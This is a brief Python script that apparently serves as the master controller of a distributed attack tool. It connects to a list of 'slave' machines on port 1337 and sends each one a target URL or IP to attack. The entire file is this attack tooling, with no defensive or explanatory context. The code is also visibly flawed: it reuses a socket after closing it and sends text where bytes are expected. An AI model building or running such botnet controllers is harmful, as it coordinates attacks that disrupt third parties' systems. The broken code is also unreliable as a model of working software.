import socket
#Put Slave Addresses in addresses array
addresses=['127.0.0.1','127.0.0.1',]
#Set target to url or IP - ie 127.0.0.1 or www.mysite.org
target = ''
port = 1337
master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
for host in addresses:
	master.connect((host,port))
	master.send(target)
	data = master.recv(1024)
	master.close()
